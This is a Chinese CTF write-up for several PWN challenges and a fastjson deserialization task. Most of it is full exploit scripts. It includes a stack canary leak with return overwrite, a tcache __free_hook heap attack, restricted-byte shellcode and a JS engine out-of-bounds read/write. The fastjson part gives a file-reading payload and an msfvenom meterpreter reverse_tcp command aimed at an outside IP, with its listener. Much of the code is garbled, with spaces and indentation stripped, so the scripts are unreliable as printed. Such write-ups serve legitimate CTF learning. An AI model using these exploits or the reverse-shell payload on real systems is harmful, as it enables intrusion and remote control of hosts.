PWN
---

### Find\_Flag

分析find\_flag程序，存在的漏洞位于sub\_132F函数中，该函数中，存在栈溢出漏洞，如下所示：

```php
.text:000000000000132F sub_132F        proc near               ; CODE XREF: main+71↓p
.text:000000000000132F; __unwind {
.text:000000000000132F                 endbr64
.text:0000000000001333                 push    rbp
.text:0000000000001334                 mov     rbp, rsp
.text:0000000000001337sub     rsp, 60h
.text:000000000000133B                 mov     rax, fs:28h
.text:0000000000001344                 mov     [rbp-8], rax
.text:0000000000001348                 xor     eax, eax
.text:000000000000134A                 lea     rdi, aHiWhatSYourNam ; "Hi! What's your name? "
.text:0000000000001351                 mov     eax, 0
.text:0000000000001356                 call    sub_1100
.text:000000000000135B                 lea     rax, [rbp-60h]
.text:000000000000135F                 mov     rdi, rax
.text:0000000000001362                 mov     eax, 0
.text:0000000000001367                 call    sub_1110            ; gets读入数据，未限制大小
.text:000000000000136C                 lea     rdi, aNiceToMeetYou ; "Nice to meet you, "
.text:0000000000001373                 mov     eax, 0
.text:0000000000001378                 call    sub_1100
.text:000000000000137D                 lea     rax, [rbp-60h]
.text:0000000000001381                 mov     rcx, 0FFFFFFFFFFFFFFFFh
.text:0000000000001388                 mov     rdx, rax
.text:000000000000138B                 mov     eax, 0
.text:0000000000001390                 mov     rdi, rdx
.text:0000000000001393                 repne scasb
.text:0000000000001395                 mov     rax, rcx
.text:0000000000001398not     rax
.text:000000000000139B                 lea     rdx, [rax-1]
.text:000000000000139F                 lea     rax, [rbp-60h]
.text:00000000000013A3                 add     rax, rdx
.text:00000000000013A6                 mov     word ptr [rax], 0A21h
.text:00000000000013AB                 mov     byte ptr [rax+2], 0
.text:00000000000013AF                 lea     rax, [rbp-60h]
.text:00000000000013B3                 mov     rdi, rax
.text:00000000000013B6                 mov     eax, 0
.text:00000000000013BB                 call    sub_1100
.text:00000000000013C0                 lea     rdi, aAnythingElse ; "Anything else? "
.text:00000000000013C7                 mov     eax, 0
.text:00000000000013CC                 call    sub_1100
.text:00000000000013D1                 lea     rax, [rbp-40h]
.text:00000000000013D5                 mov     rdi, rax
.text:00000000000013D8                 mov     eax, 0
.text:00000000000013DD                 call    sub_1110       ; gets读入数据，未限制大小
.text:00000000000013E2                 nop
.text:00000000000013E3                 mov     rax, [rbp-8]
.text:00000000000013E7                 xor     rax, fs:28h
.text:00000000000013F0                 jz      short locret_13F7
.text:00000000000013F2                 call    sub_10D0
.text:00000000000013F7
.text:00000000000013F7 locret_13F7:                            ; CODE XREF: sub_132F+C1↑j
.text:00000000000013F7                 leave
.text:00000000000013F8                 retn
.text:00000000000013F8; } // starts at 132F
.text:00000000000013F8 sub_132F        endp
```

利用代码如下所示：

```php
from pwn import*
importstruct
fs = "%17$lx,%19$lx"
flag = 0x0000000000001231
ret_offset = 0x146f
p = remote('127.0.0.1', 20701)
#p = process('./canary')
print((p.recvuntil('name? ')).decode())
p.sendline(fs.encode())
buf = (p.recvuntil('!\n').decode())
print(buf)
data = buf.split()[4].split('!')[0]
canary = (int((data.split(',')[0]), 16))
ret = (int((data.split(',')[1]), 16))
print(canary)
print(ret)
print(p.recvuntil('? ').decode())
payload = (("A"*56).encode())
payload += struct.pack("<Q", canary)
payload += (("A"*8).encode())
payload += struct.pack("<Q", flag + ret - ret_offset)
p.sendline(payload)
p.interactive()
```

### WriteBook

利用代码如下所示：

```php
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import*
exe = context.binary = ELF('./writebook')
if args.LIBC:
  libc_path = "./libc.so.6"
  os.environ['LD_PRELOAD'] = libc_path
else:
  libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(libc_path)
def start(argv=[], *a, **kw):
'''Start the exploit against the target.'''
if args.GDB:
        context.terminal = ['tmux','splitw','-h']
return gdb.debug([exe.path] + argv)
elif args.REMOTE:
return remote("127.0.0.1", "8892")
else:
return process([exe.path] + argv, *a, **kw)
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
"""
size: 32
[+] Heap-Analysis- __libc_malloc(32)=0x555555757040
page #1
1.New page
2.Write paper
3.Read paper
4.Destroy the page
5.Repick
> 3
"""
HEAP_BASE = 0
LIBC_BASE = 0
def create_page(size):
  io.sendline("1")
  io.recvuntil("both sides?")
if240< size:
    io.sendline("2")
else:
    io.sendline("1")
  io.sendline(str(size))
def remove_page(nr):
  io.sendline("4")
  io.recvuntil("Page:")
  io.sendline(str(nr))
def print_page(nr):
  io.sendline("3")
  io.recvuntil("Page:")
  io.sendline(str(nr))
def load_page(nr, data):
  io.sendline("2")
  io.recvuntil("Page:")
  io.sendline(str(nr))
  io.recvuntil("Content:")
  io.send(data)
def get_heapleak(pg_nr):
global HEAP_BASE
  print_page(pg_nr)
  io.recvuntil("Content:")
  leakstr = io.recvline()[1:-1] + b"\x00\x00"
print(hex(u64(leakstr)))
  heap_leak = u64(leakstr)
  HEAP_BASE = heap_leak - 0xd30
print("-"* 89)
print("HEAPBASE: %s"% hex(HEAP_BASE))
def get_libcleak(pg_nr):
global LIBC_BASE
  print_page(pg_nr)
  io.recvuntil("Content:")
  leakstr = io.recvline()[1:-1] + b"\x00\x00"
print(hex(u64(leakstr)))
  libc_leak = u64(leakstr)
  LIBC_BASE = libc_leak - 0x3ec070
print("-"* 89)
print("LIBC_BASE: %s"%hex(LIBC_BASE))
io = start()
io.recvuntil("> ")
# shellcode = asm(shellcraft.sh())
length = 0xf0-8
biglength = 0xf0
print("[*]First Create")
create_page(0x1e0)  
#load_page(0, cyclic(0x1e0))
payload = b"A"*8
payload += p64(0x331)
load_page(0, payload)
io.sendline()
create_page(0x40) 
create_page(0x50)
create_page(0x60)
create_page(40)
create_page(0x1e0)  
create_page(0x90)
create_page(0xf0)  
create_page(0xf0)  
create_page(0xf0)  
create_page(0xf0)  
create_page(0xf0)  
create_page(0xf0)  
create_page(0xf0)  
print("[*]Remove last 7")
remove_page(7)
remove_page(8)
remove_page(9)
remove_page(10)
remove_page(11)
remove_page(12)
remove_page(13)
print("[*]Create 0xf0")
create_page(0xf0)  
print("[*]Heap Leak")
get_heapleak(7)
print("[*]Remove last")
remove_page(7)
#7
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  
create_page(0x1e0)  #keep from merging with top
remove_page(7)
remove_page(8)
remove_page(9)
remove_page(10)
remove_page(11)
remove_page(12)
remove_page(13)
remove_page(14)
remove_page(15)
create_page(0x1d0)  
get_libcleak(7)
remove_page(7)
print("LIBC_BASE: %s"%hex(LIBC_BASE))
print("HEAP_BASE: %s"%hex(HEAP_BASE))
payload = b"-"*(0x100-8)
payload += p64(0xf1)
load_page(5, payload)
io.sendline()
#tcache is now full for 0x1e0, overflow the next chunk header and set prev size
CHUNK_TO_COALESCE = HEAP_BASE+0x260
FAKECHUNK_BASE = CHUNK_TO_COALESCE+0x18
FREE_HOOK = LIBC_BASE+0x3ed8e8
payload = b""
payload += b"A"*32
payload += p64(0x330) #fake prev_size pointing to page 0
load_page(4, payload)
payload = b"A"*8
payload += p64(0x331)
payload += p64(FAKECHUNK_BASE)
payload += p64(FAKECHUNK_BASE+0x8)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(CHUNK_TO_COALESCE)
len(payload)
load_page(0, payload)
io.sendline()
#io.interactive()
# free the page we modified the chunk on
remove_page(5)
# we now have unsorted bin pointing to 0x270 offset which overlaps. Now create a page to get that pointer
create_page(0x1d0)  
create_page(0x1d0)
create_page(0x1d0)
# then remove to get into tcache
remove_page(5)
remove_page(6)
remove_page(7)
remove_page(8)
# 0x270 offset pointer is now in tcache
# overwrite the next pointer
payload = b""
payload += p64(0)
payload += p64(0x1e1)
payload += p64(FREE_HOOK)
load_page(0, payload)
io.sendline()
create_page(0x1d0)
create_page(0x1d0)
# Write the magic gadget to __free_hook ptr
payload = p64(LIBC_BASE+0x4f432)
load_page(6, payload)
io.sendline()
# free a page
remove_page(3)
io.interactive()
"""
0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL
"""
```

### CreateCode

反编译create\_code，漏洞点见如下代码注释处：

```php
.text:00000000000013F0 sub_13F0        proc near               ; CODE XREF: main+AE↓p
.text:00000000000013F0; __unwind {
.text:00000000000013F0                 endbr64
.text:00000000000013F4                 push    rbp
.text:00000000000013F5                 mov     rbp, rsp
.text:00000000000013F8sub     rsp, 10h
.text:00000000000013FC                 mov     dword ptr [rbp-0Ch], 0
.text:0000000000001403                 mov     eax, cs:dword_4040
.text:0000000000001409                 cmp     eax, 2Eh; '.'
.text:000000000000140C                 jle     short loc_142E
.text:000000000000140E                 mov     edx, 0Fh
.text:0000000000001413                 lea     rsi, aNoMoreData ; "no more data.\n"
.text:000000000000141A                 mov     edi, 1
.text:000000000000141F                 mov     eax, 0
.text:0000000000001424                 call    sub_10C0
.text:0000000000001429                 jmp     locret_153C
.text:000000000000142E; ---------------------------------------------------------------------------
.text:000000000000142E
.text:000000000000142E loc_142E:                               ; CODE XREF: sub_13F0+1C↑j
.text:000000000000142E                 mov     eax, cs:dword_4040
.text:0000000000001434                 add     eax, 1
.text:0000000000001437                 mov     cs:dword_4040, eax
.text:000000000000143D                 mov     edi, 324h
.text:0000000000001442                 call    sub_10F0         ; 申请1000字节大小的内存
.text:0000000000001447                 mov     [rbp-8], rax
.text:000000000000144B                 mov     rax, [rbp-8]
.text:000000000000144Fand     rax, 0FFFFFFFFFFFFF000h
.text:0000000000001455                 mov     edx, 7
.text:000000000000145A                 mov     esi, 1000h
.text:000000000000145F                 mov     rdi, rax
.text:0000000000001462                 call    sub_1100         ; 设置申请的内存属性为RWX
.text:0000000000001467                 mov     edx, 9
.text:000000000000146C                 lea     rsi, aContent   ; "content: "
.text:0000000000001473                 mov     edi, 1
.text:0000000000001478                 mov     eax, 0
.text:000000000000147D                 call    sub_10C0
.text:0000000000001482                 mov     rax, [rbp-8]
.text:0000000000001486                 mov     edx, 3E8h
.text:000000000000148B                 mov     rsi, rax
.text:000000000000148E                 mov     edi, 0
.text:0000000000001493                 mov     eax, 0
.text:0000000000001498                 call    sub_10E0         ; 读取数据到内存中
.text:000000000000149D                 mov     eax, cs:dword_4040
.text:00000000000014A3                 cdqe
.text:00000000000014A5                 lea     rcx, ds:0[rax*8]
.text:00000000000014AD                 lea     rdx, unk_4060
.text:00000000000014B4                 mov     rax, [rbp-8]
.text:00000000000014B8                 mov     [rcx+rdx], rax
.text:00000000000014BC                 mov     rax, [rbp-8]
.text:00000000000014C0                 mov     eax, [rax]
.text:00000000000014C2                 cmp     eax, 0F012F012h; 判断起始地址是否为0xF012F012
.text:00000000000014C7                 jnz     short loc_1517
.text:00000000000014C9                 jmp     short loc_14EF
.text:00000000000014CB; ---------------------------------------------------------------------------
.text:00000000000014CB
.text:00000000000014CB loc_14CB:                               ; CODE XREF: sub_13F0+106↓j
.text:00000000000014CB                 mov     rdx, [rbp-8]
.text:00000000000014CF                 mov     eax, [rbp-0Ch]
.text:00000000000014D2                 cdqe
.text:00000000000014D4                 movzx   eax, byte ptr [rdx+rax+4]
.text:00000000000014D9                 cmp     al, 0Fh; 判断数据值是否>0xF
.text:00000000000014DB                 jbe     short loc_14EB
.text:00000000000014DD                 mov     rdx, [rbp-8]
.text:00000000000014E1                 mov     eax, [rbp-0Ch]
.text:00000000000014E4                 cdqe
.text:00000000000014E6                 mov     byte ptr [rdx+rax+4], 0; 大于0xF，则置0
.text:00000000000014EB
.text:00000000000014EB loc_14EB:                               ; CODE XREF: sub_13F0+EB↑j
.text:00000000000014EB                 add     dword ptr [rbp-0Ch], 1
.text:00000000000014EF
.text:00000000000014EF loc_14EF:                               ; CODE XREF: sub_13F0+D9↑j
.text:00000000000014EF                 cmp     dword ptr [rbp-0Ch], 3E7h遍历内存中的数据
.text:00000000000014F6                 jle     short loc_14CB
.text:00000000000014F8                 mov     rax, [rbp-8]
.text:00000000000014FC                 add     rax, 4
.text:0000000000001500                 mov     cs:qword_4048, rax
.text:0000000000001507                 mov     rdx, cs:qword_4048
.text:000000000000150E                 mov     eax, 0
.text:0000000000001513                 call    rdx ; qword_4048   ; 执行申请内存处的代码
.text:0000000000001515                 jmp     short loc_1521
.text:0000000000001517; ---------------------------------------------------------------------------
.text:0000000000001517
.text:0000000000001517 loc_1517:                               ; CODE XREF: sub_13F0+D7↑j
.text:0000000000001517                 mov     rax, [rbp-8]
.text:000000000000151B                 mov     dword ptr [rax], 4
.text:0000000000001521
.text:0000000000001521 loc_1521:                               ; CODE XREF: sub_13F0+125↑j
.text:0000000000001521                 mov     edx, 15h
.text:0000000000001526                 lea     rsi, aCreateSuccessf ; "create successfully.\n"
.text:000000000000152D                 mov     edi, 1
.text:0000000000001532                 mov     eax, 0
.text:0000000000001537                 call    sub_10C0
.text:000000000000153C
.text:000000000000153C locret_153C:                            ; CODE XREF: sub_13F0+39↑j
.text:000000000000153C                 leave
.text:000000000000153D                 retn
.text:000000000000153D; } // starts at 13F0
.text:000000000000153D sub_13F0        endp
```

通过上述分析，可以知道，申请了1000字节RWX内存，当前四字节内容为0xF012F012时，会为进一步判断后续内存数据，数据内容限定在0~0xF之间，后续直接执行此处代码。因而，这里可以使用如下指令进行构造，exp如下：

```php
from pwn import*
context(os='linux', arch='amd64')
#context.log_level = 'debug'
BINARY = './create_code'
elf = ELF(BINARY)
if len(sys.argv) > 1and sys.argv[1] == 'r':
    HOST = "127.0.0.1"
    PORT = 8888
    s = remote(HOST, PORT)
else:
    s = process(BINARY)
#context.terminal = ['tmux', 'splitw', '-h']
#s = gdb.debug(BINARY)
s.sendline('1')
print(s.recvuntil("content: "))
flag = b"\x12\xF0\x12\xF0"
buf = asm('''
 add DWORD PTR [rip+0x600], eax
''')
# make xor ecx,ecx   code 0x31c9
buf += asm('''
 add al, 0x0d
 add al, 0x0d
 add al, 0x0d
 add BYTE PTR [rdx+rax*1], al
 add al, 0x01
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
''')
# padding
buf += asm('''
 add cl,  BYTE PTR [rdx]
 add cl,  BYTE PTR [rdx]
 add cl,  BYTE PTR [rdx+rax*1]
''')
buf += b"\x00"*(0x27-len(buf))
buf += b"\x0a\x01"
# rcx = 0x200
buf += asm('''
 add ecx, DWORD PTR [rip+0x30f]
''')
# push rdx   # 0x52
buf += asm('''
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# pop rdi    # 0x5f
buf += asm('''
 add cl, byte PTR [rdx] 
 add al, 6
 add byte PTR [rdx+rcx*1], al
 add al, 1
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x30
# add rdi, 0x30f  # 4881c70f030000
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
''')
# al = 0x40
# xor esi, esi  # 0x31f6
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x30
# xor edx, edx  # 0x31d2
buf += asm('''
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x31
# push 0x3b  # 0x6a3b
buf += asm('''
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x31
# pop rax  # 0x58
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 0xf
 add al, 0x9
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x58
# make /bin/sh
# rcx = 0x200
buf += asm('''
 add ecx, DWORD PTR [rip+0x20f]
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0x5
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add al, 2
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# padding
buf += asm('''
 add cl,  BYTE PTR [rdx]
''')*((0x200-len(buf))//2 - 1)
buf += asm('''
 add cl, byte PTR [rdx+rax*1]
''')
buf += b"\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05"
buf += b"\x00"*(0x2df-len(buf))
buf += b"\x00\x01"# rcx = 0x30f
buf += b"\x00"*(0x30f-len(buf))
buf += b"\x0f\x02\x09\x0e\x0f\x0d\x02"# /bin/sh
buf += b"\x00"*(0x30f+0x2f-len(buf))
buf += b"\x00\x02"# rcx = 0x200
buf += b"\x00"*(1000-len(buf))
s.sendline(flag+buf)
s.interactive()
```

### Hello\_Jerry

本题将 array.shift 进行了 patch ，每一次 shift 会将 length 减 2 ，那么当 length 为 1 的时候进行一次 shift 便可以得到一个 oob array ，之后便是常规的思路：

```php
leak elf_base -> leak libc_base -> leak stack_base -> write ret_addr to one_gadget
```

编辑exp.js。

```php
function printhex(s,u){
print(s,"0x"+ u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0'));
}
function hex(i){
return"0x"+ i.toString(16).padStart(16, '0');
}
function pack64(u){
return u[0] + u[1] * 0x100000000;
}
function l32(data){
let result = 0;
for(let i=0;i<4;i++){
        result <<= 8;
        result |= data & 0xff;
        data >>= 8;
}
return result;
}
a = [1.1];
a.shift();
var ab = newArrayBuffer(0x1337);
var dv = newDataView(ab);
var ab2 = newArrayBuffer(0x2338);
var dv2 = newDataView(ab2);
for(let i = 0; i < 0x90; i++){
    dv2 = newDataView(ab2);
}
a[0x193] = 0xffff;
print("[+]change ab range");
a[0x32] = 0xdead;
for(let i = 0; i < 100000000; i ++){
}
var idx = 0;
for(let i = 0; i < 0x5000; i++){
let v = dv.getUint32(i, 1);
if(v == 0x2338){
        idx = i;
}
}
print("Get idx!");
function arb_read(addr){
    dv.setUint32(idx + 4, l32(addr[0]));
    dv.setUint32(idx + 8, l32(addr[1]));
let result = newUint32Array(2);
    result[0] = dv2.getUint32(0, 1)
    result[1] = dv2.getUint32(4, 1);
return result;
}
function arb_write(addr,val){
    dv.setUint32(idx + 4, l32(addr[0]));
    dv.setUint32(idx + 8, l32(addr[1]));
    dv2.setUint32(0, l32(val[0]));
    dv2.setUint32(4, l32(val[1]));
}
var u = newUint32Array(2);
u[0] = dv.getUint32(idx + 4, 1);
u[1] = dv.getUint32(idx + 8, 1);
print(hex(pack64(u)));
var elf_base = newUint32Array(2);
elf_base[0] = u[0] - 0x6f5e0;
elf_base[1] = u[1];
printhex("elf_base:",elf_base);
var free_got = newUint32Array(2);
free_got[0] = elf_base[0] + 0x6bdd0;
free_got[1] = elf_base[1];
printhex("free_got:",free_got);
var libc_base = arb_read(free_got);
libc_base[0] -= 0x9d850;
printhex("libc_base:",libc_base);
var environ_addr = newUint32Array(2);
environ_addr[0] = libc_base[0] + 0x1ef2d0;
environ_addr[1] = libc_base[1];
printhex("environ_addr:",environ_addr);
var stack_addr = arb_read(environ_addr);
printhex("stack_addr:",stack_addr);
var one_gadget = newUint32Array(2);
one_gadget[0] = (libc_base[0] + 0xe6c7e);
one_gadget[1] = libc_base[1];
printhex("one_gadget:",one_gadget);
stack_addr[0] -= 0x118;
arb_write(stack_addr,one_gadget);
var zero = newUint32Array(2);
zero[0] = 0;
zero[1] = 0;
printhex("zero:",zero);
stack_addr[0] -= 0x29;
arb_write(stack_addr,zero);
print("finish");
for(let i = 0; i < 100000000; i ++){
}
```

编辑exp。

```php
#!/usr/bin/env python
importstring
from pwn import*
from hashlib import sha256
context.log_level = "debug"
dic = string.ascii_letters + string.digits
DEBUG = 0
def solvePow(prefix,h):
for a1 in dic:
for a2 in dic:
for a3 in dic:
for a4 in dic:
                    x = a1 + a2 + a3 + a4
                    proof = x + prefix.decode("utf-8")
                    _hexdigest = sha256(proof.encode()).hexdigest()
if _hexdigest == h.decode("utf-8"):
return x
r = remote("127.0.0.1",9998)
r.recvuntil("sha256(XXXX+")
prefix = r.recvuntil(") == ", drop = True)
h = r.recvuntil("\n", drop = True)
result = solvePow(prefix,h)
r.sendlineafter("Give me XXXX:",result)
data = open("./exp.js","r").read()
data = data.split("\n")
for i in data:
if i == "":
continue
    r.sendlineafter("code> ",i)
r.sendlineafter("code> ","EOF")
r.interactive()
```

### 还是你熟悉的fastjson吗

由代码可看到，依赖中使用了fastjson和`org.fusesource.leveldbjni`，通过这fastjosn进行反序列化，并结合leveldbjni进行rce。  
找到参考文档：

```php
https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf
```

以及skay小姐姐对上面议题的代码分析：

```php
http://noahblog.360.cn/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/
```

**读取文件目录，获取so文件名。**  
需要先访问一次/test接口生成数据库和so文件，再读取文件名。

```php
import requests
import os
import sys
import re
importstring
#step1
#read /tmp/ directory to find so file
host = "http://11.1.1.18:8080"
def step1():
global host
    result = []
def getArrayData(ch):
out= []
for c in result:
out.append(str(ord(c)))
out.append(str(ord(ch)))
return','.join(out)
def poc(ch):
        url = '/hello'
        jsonstr = '{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"netdoc:///tmp/"},"charsetName":"utf-8","bufferSize":1024},"boms":[{"charsetName":"utf-8","bytes":[%s]}]},"address":{"$ref":"$.abc.BOM"}}'
        data = {
'data': jsonstr % getArrayData(ch)
}
        proxy = {'http':'127.0.0.1:8080'}
        proxy = {}
        rsp = requests.post(host+url, data=data, proxies=proxy)
if"bytes"in rsp.text:
returnTrue
else:
returnFalse
whileTrue:
for ch instring.printable+'\r\n':
if poc(ch):
                result.append(ch)
print('step1>', ''.join(result))
break
step1()
```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c329e354765c770d031af209f679c9a9c70ad6c4.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_17%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

**二进制文件修改分析。**  
通过议题ppt给出的shellcode注入位置，是在文件偏移`0x197b0`处。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ca2024053fcb1d3b19e46f98468fb0b56868c3a3.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

反汇编代码如下：  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a93367853efd7f3a56b911edf9e3758889daac1f.webp%23pic_center)

然而这里的空间比较小，只能jump到另外的位置去，将shellcode放到空的代码区局，找起来不方便。  
这里参考skay小姐姐的方法，放到如下图的函数中，将shellcode设置为反弹msf的shellcode。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1bd94063c80c4b46ae4ffea4f1d84d4734ad4853.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3a308a3dc0e7822642cfc09a78f26146f95a1744.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

生成shellcode

```php
msfvenom -a x64 --platform Linux-p linux/x64/meterpreter/reverse_tcp LHOST=39.103.160.59 LPORT=4444> shellcode
```

监听

```php
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
exploit -j
```

**写文件。**  
问题：测试时写文件，发现文件存在，则上传的文件为.bak结尾。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d2eb1879973d251ea47b8f58c1e74c306312faa0.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

但是代码中给了一段copy覆盖的代码，用来解决这个问题。  
参考skay小姐姐的base64编码的方法：

```php
http://noahblog.360.cn/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/
```

接下来就是将修改后的so文件上传并替换了，文件名为通过第一步获取到的文件名。  
上传后，再次访问/test接口，触发rce。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9a8dc1bd62adb764295a280450b9eb411c17b05a.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_19%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e83cb3f18f58143ae8aa2e17e125f192f2e1ccca.webp%23pic_center)

OK，读取之到此结束。